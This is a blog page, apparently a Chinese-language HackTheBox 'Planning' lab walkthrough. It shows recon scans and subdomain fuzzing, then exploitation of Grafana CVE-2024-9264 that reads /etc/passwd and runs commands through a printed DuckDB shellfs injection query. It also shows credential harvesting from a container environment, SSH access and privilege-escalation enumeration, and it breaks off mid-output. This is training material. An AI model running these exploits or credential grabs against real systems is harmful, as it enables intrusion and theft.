<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">HackTheBox - Machine - Planning | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Machine - Planning

 https://app.hackthebox.com/machines/Planning | `Esay`
 

前期踩点







收集到一个邮箱 `info@planning.htb`



Web 渗透

信息收集

访问 `HTTP` 服务，采集指纹



可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Ha..." data-next-head=""/><meta property="og:title" content="HackTheBox - Machine - Planning | Sunset Blog" data-next-head=""/><meta property="og:description" content="Machine - Planning

 https://app.hackthebox.com/machines/Planning | `Esay`
 

前期踩点







收集到一个邮箱 `info@planning.htb`



Web 渗透

信息收集

访问 `HTTP` 服务，采集指纹



可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Ha..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/05/11/HackTheBoxMachine - Planning" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-05-11" data-next-head=""/><meta property="article:modified_time" content="2025-09-20" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="article:tag" content="Grafana" data-next-head=""/><meta property="article:tag" content="Crontab" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Machine - Planning" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/05/11/HackTheBoxMachine - Planning" data-next-head=""/><link rel="preload" href="/_next/static/css/e6dcfa5be8702d82.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-05-11","description":"Machine - Planning\n\n https://app.hackthebox.com/machines/Planning | `Esay`\n \n\n前期踩点\n\n\n\n\n\n\n\n收集到一个邮箱 `info@planning.htb`\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 `HTTP` 服务，采集指纹\n\n\n\n可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Ha...","mainEntityOfPage":{"@type":"WebPage","@id":"https://sunsetaction.top/2025/05/11/HackTheBoxMachine - Planning"},"headline":"HackTheBox - Machine - Planning","image":["https://sunsetaction.top/images/logo.png"],"dateModified":"2025-09-20","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://sunsetaction.top/images/logo.png"}}}</script><link rel="stylesheet" href="/_next/static/css/e6dcfa5be8702d82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/147-e33b339acc3d8930.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-1aff2f82080a52f7.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_buildManifest.js" defer=""></script><script src="/_next/static/QF_69xfpA3_zMvnMTdy4T/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">HackTheBox - Machine - Planning</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-05-11</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-09-20<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Grafana</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Crontab</span></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Planning","contentHtml":"\u003ch1\u003eMachine - Planning\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Planning\"\u003ehttps://app.hackthebox.com/machines/Planning\u003c/a\u003e | \u003ccode\u003eEsay\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning nmap -sT -min-rate 10000 -p- 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:56 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e planning.htb (10.10.11.68)\nHost is up (0.19s latency).\nNot shown: 65269 filtered tcp ports (no-response), 264 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 50.82 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning nmap -sU -min-rate 5000 -p- 10.10.11.68                                                                                                                                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 01:01 EDT\nWarning: 10.10.11.68 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e planning.htb (10.10.11.68)\nHost is up (4.5s latency).\nAll 65535 scanned ports on planning.htb (10.10.11.68) are \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ignored states.\nNot shown: 65443 open|filtered udp ports (no-response), 92 closed udp ports (port-unreach)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 176.18 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning nmap -sT -A -T4 -O -p 22,80 10.10.11.68\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:59 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e planning.htb (10.10.11.68)\nHost is up (0.21s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)\n|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-server-header: nginx/1.24.0 (Ubuntu)\n|_http-title: Edukate - Online Education Website\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   221.80 ms 10.10.16.1\n2   161.43 ms planning.htb (10.10.11.68)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 24.81 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e收集到一个邮箱 \u003ccode\u003einfo@planning.htb\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning whatweb planning.htb\nhttp://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务，采集指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可能有用的三个用户名 \u003ccode\u003eBob Moss\u003c/code\u003e \u003ccode\u003eRose Mary\u003c/code\u003e \u003ccode\u003eStella Haks\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDetail.php\u003c/code\u003e 页面可以注册，但是貌似没什么用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning dirsearch -u http://planning.htb -x 404,429 -e php,zip,txt \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Planning/reports/http_planning.htb/_25-05-11_01-14-34.txt\n\nTarget: http://planning.htb/\n\n[01:14:34] Starting: \n[01:14:51] 200 -   12KB - /about.php\n[01:15:12] 200 -   10KB - /contact.php\n[01:15:13] 301 -  178B  - /css  -\u003e  http://planning.htb/css/\n[01:15:24] 301 -  178B  - /img  -\u003e  http://planning.htb/img/\n[01:15:27] 301 -  178B  - /js  -\u003e  http://planning.htb/js/\n[01:15:27] 403 -  564B  - /js/\n[01:15:29] 301 -  178B  - /lib  -\u003e  http://planning.htb/lib/\n[01:15:29] 403 -  564B  - /lib/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破一下子域名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.planning.htb'\u003c/span\u003e                                                                               \n********************************************************                                                                                                                                                                            \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                                            \n********************************************************                                                                                                                                                                            \n                                                                                                                                                                                                                                    \nTarget: http://planning.htb/                                                                                                                                                                                                        \nTotal requests: 100000                                                                                                                                                                                                              \n                                                                                                                                                                                                                                    \n=====================================================================                                                                                                                                                               \nID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     \n=====================================================================    \n000024093:   302        2 L      2 W        29 Ch       \u003cspan class=\"hljs-string\"\u003e\"grafana\"\u003c/span\u003e    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能找到叫 \u003ccode\u003egrafana\u003c/code\u003e 的子域名，添加到 \u003ccode\u003ehosts\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e访问一下，版本是 \u003ccode\u003eGrafana v11.0.0 (83b9528bce)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eGrafana\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eGrafana 是一个开源的度量分析和可视化工具，支持多种数据源如 Graphite、InfluxDB 等。安装完成后，Grafana 的默认用户名和密码都是\u003cem\u003e\u003cstrong\u003eadmin\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e尝试下默认密码，是失败的\u003c/p\u003e\n\u003cp\u003e找一下版本相关漏洞\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/nollium/CVE-2024-9264\"\u003ehttps://github.com/nollium/CVE-2024-9264\u003c/a\u003e 可以进行 LFI 和 RCE ，但是要验证后\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/\"\u003ehttps://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/\u003c/a\u003e XSS 漏洞\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e然后发现：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eAs is common \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e real life pentests, you will start the Planning box with credentials \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the following account: admin / 0D5oT70Fq13EvB5r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003eadmin\u003c/code\u003e/\u003ccode\u003e0D5oT70Fq13EvB5r\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e尝试利用 \u003ccode\u003eCVE-2024-9264\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功利用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e http://grafana.planning.htb\n[+] Logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e as admin:0D5oT70Fq13EvB5r\n[+] Executing \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\n[+] Successfully ran duckdb query:\n[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv(\u003cspan class=\"hljs-string\"\u003e'whoami \u003e/tmp/grafana_cmd_output 2\u003e\u0026#x26;1 |'\u003c/span\u003e):\n[+] Successfully ran duckdb query:\n[+] SELECT content FROM read_blob(\u003cspan class=\"hljs-string\"\u003e'/tmp/grafana_cmd_output'\u003c/span\u003e):\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们在 Docker 环境中\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eDocker 逃逸\u003c/h2\u003e\n\u003cp\u003e反弹 \u003ccode\u003eshell\u003c/code\u003e 后对 \u003ccode\u003eshell\u003c/code\u003e 进行优化 ：\u003ca href=\"https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\"\u003ehttps://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eenv\u003c/code\u003e 命令输出中，能找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@7ce659d667d7:~# \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e    \n...      \nGF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!\nGF_SECURITY_ADMIN_USER=enzo\n...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试用改凭据进行 SSH 登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Planning ssh enzo@planning.htb \nenzo@planning.htb\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Sun May 11 06:26:45 AM UTC 2025\n\n  System load:           0.13\n  Usage of /:            77.6% of 6.30GB\n  Memory usage:          43%\n  Swap usage:            16%\n  Processes:             294\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.68\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:4d58\n\n  =\u003e There are 43 zombie processes.\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\n1 additional security update can be applied with ESM Apps.\nLearn more about enabling ESM Apps service at https://ubuntu.com/esm\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun May 11 06:27:42 2025 from 10.10.16.12\nenzo@planning:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功进入…\u003c/p\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e在当前目录下可以找到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eenzo@planning:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n97cbc3d1ee1c848ab5255a90dc366206\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传 \u003ccode\u003eLinpeas\u003c/code\u003e 收集信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╔══════════╣ SUID - Check easy privesc, exploits and write perms\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid\n-rwsr-xr-x 1 root root 19K Dec  2 11:59 /usr/lib/polkit-1/polkit-agent-helper-1\n-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 39K Dec  5 02:26 /usr/bin/umount  ---\u003e  BSD/Linux(08-1996)\n-rwsr-xr-x 1 root root 51K Dec  5 02:26 /usr/bin/mount  ---\u003e  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\n-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  ---\u003e  check_if_the_sudo_version_is_vulnerable\n-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  ---\u003e  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)\n-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh\n-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  ---\u003e  HP-UX_10.20\n-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  ---\u003e  SuSE_9.3/10\n-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3\n-rwsr-xr-x 1 root root 55K Dec  5 02:26 /usr/bin/su\n-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 1.4M May 11 04:23 /tmp/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╔══════════╣ Active Ports\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:37777         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      